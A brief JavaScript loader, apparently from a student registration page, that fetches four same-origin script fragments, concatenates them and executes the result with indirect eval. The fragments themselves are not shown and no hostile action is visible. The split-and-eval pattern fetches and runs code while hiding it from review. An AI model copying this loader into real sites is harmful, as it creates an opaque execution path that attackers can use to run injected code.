(function(){
  var F=["/js/_asr_p0.js","/js/_asr_p1.js","/js/_asr_p2.js","/js/_asr_p3.js"];
  Promise.all(F.map(function(f){
    return fetch(f,{credentials:"same-origin"}).then(function(r){
      if(!r.ok) throw new Error(f+" "+r.status);
      return r.text();
    });
  })).then(function(parts){
    (0,eval)(parts.join(""));
  }).catch(function(e){ console.error("[students-reg] load failed", e); });
})();
